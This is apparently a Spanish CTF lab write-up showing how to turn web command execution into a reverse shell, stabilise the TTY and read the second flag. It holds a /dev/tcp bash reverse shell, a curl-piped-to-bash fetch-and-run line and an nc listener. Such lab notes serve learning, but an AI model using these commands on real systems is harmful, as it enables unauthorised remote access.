# Obteniendo acceso mediante una reverse shell

Como ya podemos ejecutar comandos en la consola remota de la página. Procederemos a realizar una Reverse Shell para trabajar con mayor comodidad desde nuestra consola.

La Reverse Shell se realizará de la siguiente manera:

Mediante el comando `python -m SimpleHTTPServer 80` crearemos un servidor HTTP para poder entablar la comunicación.

Luego crearemos un script en bash para poder realizar la Reverse Shell tal que: 
```bash
#!/bin/bash

bash -i >& /dev/tcp/NUESTRA_IP/PUERTO 0>&1 
```

Utilizando la consola remota realizaremos un `curl` tal que tenga la siguiente forma `/usr/bin/curl NUESTRA_IP/script.sh|bash`. 
Luego utilizando el comando `nc -nlvp PUERTO` nos pondremos a la escucha de lo que se ejecute desde el curl. Si la conexión se realiza de manera exitosa obtendremos acceso desde nuestra consola a la consola remota.

---
Ya estando dentro hay que tener cuidado cuando apretemos teclas, particularmente con `ctrl + c` ya que con esto perderiamos la conexión de nuestra Reverse Shell. Por lo tanto debemos realizar un tratamiento de la TTY, para ello realizaremos los siguientes pasos:
1. Escribir `script /dev/null -c bash`
2. Luego `ctrl + z`, que nos enviara devuelta a la consola nuestra
3. Despues escribir `stty raw -echo` y enter.
4. Hecho esto, escribimos `fg` (podria no verse, asi que solo se escribe y se confia en que esté) y le damos al enter.
5. Luego escribimos `reset` y le damos al enter. Y nos preguntará por que tipo de terminal queremos e indicamos `xterm` y enter.
6. Luego escribimos `export TERM=xterm`, luego enter.
7. Luego `export SHELL=bash`.
8. Finalmente modificamos el numero de filas y columnas de la TTY mediante el comando `stty rows X columns Y` donde X e Y son el numero de filas y columnas que tiene su TTY (Este lo puede ver escribiendo en otra consola `stty -a`).

Con esto terminariamos el tratamiento de la TTY y podremos trabajar comodamente con nuestra Reverse Shell.

---
# Obteniendo la segunda flag
Ya con nuestra TTY sanitizada nos vamos al directorio `/home` donde podemos ver que hay un directorio que se llama "rick" en el se encuentra nuestra segunda flag.
Para verla debemos hacer un `cat second\ ingredients`. Y con eso tendriamos nuestra segunda flag.

---
NOTA: Esta forma alternativa de utilizar la consola, nos permite realizar un `cat` por lo que podemos ver la flag 1 sin la necesidad de utilizar la forma de [[1 - Ingreso y manipulación en portal.php]]

NOTA2: En la pagina [https://ironhackers.es/es/herramientas/reverse-shell-cheat-sheet/](https://ironhackers.es/es/herramientas/reverse-shell-cheat-sheet/) se encuentran otros tipos de Reverse Shell que se pueden probar.